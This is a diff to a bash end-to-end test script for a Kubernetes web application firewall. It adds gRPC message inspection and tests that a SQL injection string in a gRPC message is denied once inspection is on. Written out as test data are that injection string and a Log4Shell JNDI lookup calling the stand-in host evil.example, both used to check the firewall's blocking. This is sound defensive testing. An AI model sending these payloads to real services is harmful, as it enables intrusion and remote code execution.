@@ -334,7 +334,8 @@ condition() {
 }
 ready() { [[ $(condition Ready status) == True ]]; }
 programmed_both() { [[ $(condition Programmed message) == *"wired to the engine in Traefik"*"wired to the engine in Envoy Gateway"* ]]; }
-# policy [MODE]: the shared policy, in Block mode by default.
+# policy [MODE [GRPC_MESSAGES]]: the shared policy, in Block mode by
+# default; GRPC_MESSAGES sets body.grpcMessages.
 policy() {
   "${KUBECTL[@]}" apply --server-side -f - >/dev/null <<YAML
 apiVersion: waf.inkwall.dev/v1alpha1
@@ -351,6 +352,7 @@ spec:
   timeout: 1s
   webSocket:
     allowedOrigins: ["$WS_ORIGIN"]
+${2:+  body: {grpcMessages: $2\}}
 YAML
 }
 eep_accepted() {
@@ -443,6 +445,23 @@ grpc_web_denied() {
   [[ $(grpc_web_status "$CUSTOM_PORT") == "200 7" && $(grpc_web_status "$PLAIN_PORT") == "200 7" &&
     $(grpc_web_status "$TRAEFIK_PORT") == "403 7" ]]
 }
+# grpc_message_is CODE TEXT: a gRPC call with TEXT in its message (the
+# HealthCheckRequest's service) ends with CODE, through both Gateways and
+# Traefik; grpc_message_isnt: with any other code.
+grpc_message_is() {
+  local port
+  for port in "$CUSTOM_PORT" "$PLAIN_PORT" "$TRAEFIK_PORT"; do
+    [[ $("$work/grpchealth" -authority "$HOST" -service "$2" "127.0.0.1:$port") == "$1" ]] || return 1
+  done
+}
+grpc_message_isnt() {
+  local port code
+  for port in "$CUSTOM_PORT" "$PLAIN_PORT" "$TRAEFIK_PORT"; do
+    code=$("$work/grpchealth" -authority "$HOST" -service "$2" "127.0.0.1:$port" 2>/dev/null) || return 1
+    [[ -n $code && $code != "$1" ]] || return 1
+  done
+}
+GRPC_MESSAGE_ATTACK="1' OR '1'='1' -- "
 # Log4Shell (944150), quoted: not a shell expansion.
 GRPC_ATTACK='x-api-key=${jndi:ldap://evil.example/a}'
 no_limits() { ! "${KUBECTL[@]}" -n "$NS" get clienttrafficpolicy inkwall-waf-custom inkwall-waf-plain -o name 2>/dev/null | grep . >/dev/null; }
@@ -534,6 +553,13 @@ check "a WebSocket with an attack in its URL gets 403" ws_are 403 "/ws?room=1%27
 check "a WebSocket with an attack in a header gets 403" ws_are 403 /ws "$WS_ORIGIN" 'Sec-WebSocket-Protocol: ${jndi:ldap://evil.example/a}'
 check "and its client gets the engine's gRPC status, not an HTTP 403" grpc_denied_by_engine "$GRPC_ATTACK"
 check "a gRPC-Web call with an attack in its metadata gets grpc-status 7" grpc_web_denied
+# gRPC messages (#275): read only with body.grpcMessages: Inspect.
+check "an attack in a gRPC message passes by default (path and metadata only)" \
+  grpc_message_isnt PermissionDenied "$GRPC_MESSAGE_ATTACK"
+policy Block Inspect
+eventually "with grpcMessages: Inspect, an attack in a gRPC message is denied" \
+  grpc_message_is PermissionDenied "$GRPC_MESSAGE_ATTACK"
+check "and a clean gRPC call passes" grpc_are OK
 
 echo "== detect mode"
 policy Detect
